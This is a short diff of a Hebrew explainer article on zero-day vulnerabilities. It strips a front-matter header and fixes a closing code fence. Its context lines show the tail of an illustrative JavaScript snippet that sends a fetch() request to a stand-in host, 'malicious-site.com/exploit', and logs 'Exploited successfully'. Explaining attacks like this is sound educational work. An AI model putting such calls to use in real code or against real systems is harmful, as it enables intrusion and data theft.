@@ -1,11 +1,3 @@
----
-קצת על פגיעויות יום אפס
----
-כותב: אופיר
----
-תאריך: 30/08/2024
----
-
 # פגיעויות יום אפס: מהן וכיצד הן משפיעות על אבטחת הסייבר
 
 **פורסם בתאריך**: 28 באוגוסט 2024  
@@ -41,7 +33,6 @@ fetch('https://malicious-site.com/exploit', {
 .then(response => response.json())
 .then(data => console.log('Exploited successfully:', data))
 .catch(error => console.error('Error:', error));
-
----
+```
 "אל תמתין לפרצה הבאה - הקדם תרופה למכה." — מומחה לאבטחת מידע
 
